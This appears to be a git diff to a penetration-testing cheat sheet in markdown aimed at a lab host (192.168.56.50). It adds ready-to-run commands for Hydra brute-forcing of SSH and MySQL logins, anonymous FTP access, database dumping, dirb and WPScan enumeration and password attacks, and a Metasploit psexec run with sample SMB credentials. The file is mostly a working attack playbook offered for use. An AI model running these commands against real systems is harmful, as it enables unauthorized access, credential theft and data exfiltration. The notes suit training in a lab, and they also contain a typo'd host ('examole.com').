@@ -52,7 +52,6 @@ $ smbclient -L 192.168.56.50
 $ smbclient //192.168.56.50/shared
 ```
 -------------------
-------------------
 
 ## SSH Enumeration
 
@@ -64,7 +63,7 @@ $ hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr
 ```
 $ hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.50
 ```
-
+--------------
 
 ## FTP Enumeration
 
@@ -72,7 +71,72 @@ $ hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.50
 ```
 $ nmap 192.168.56.50 -p 21 --script ftp-anon
 ```
+#### If anonymous login is allowed, we can connect using
+```
+$ ftp 192.168.56.50
 
+username: anonymous
+password: anonymous
+```
+--------------
+
+## MySQL Enumeration
+
+#### To Bruteforce for MySQL creds
+```
+$ hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt mysql://192.168.56.50
+```
+#### To Bruteforce for MySQL creds with a Known Username, e.g root
+```
+$ hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.56.50
+```
+#### To connect to mysql database with credentials
+```
+mysql -h 192.168.56.50 -u root -p
+```
+#### To dump a database after connecting to the mysql server
+```
+show databases;
+use (database)
+show tables;
+select * from (tables);
+```
+---------------------
+
+## Directory Enumeration
+
+#### To enumerate sub directories
+```
+$ dirb http://192.168.56.50
+```
+----------------
+
+## Wordpress Enumeration
+
+#### To bruteforce for plugins, themes and users 
+```
+$ wpscan --url http://example.com --enumerate p --enumerate t --enumerate u
+```
+#### To bruteforce password for a particular user
+```
+$ wpscan --url http://examole.com -U blackanon -P /usr/share/wordlists/rockyou.txt
+```
+-----------------------
+
+# Exploitation
+<hr>
+
+## SMB Exploitation
+
+#### If you have SMB Credentials for example username: blackanon  password: blackanon123. You can try psexec module on metasploit 
+```
+use exploit/windows/smb/psexec
+set SMBUser blackanon
+set SMBPass blackanon123
+set RHOSTS 192.168.56.50
+run
+```
+-----------
 
 
 
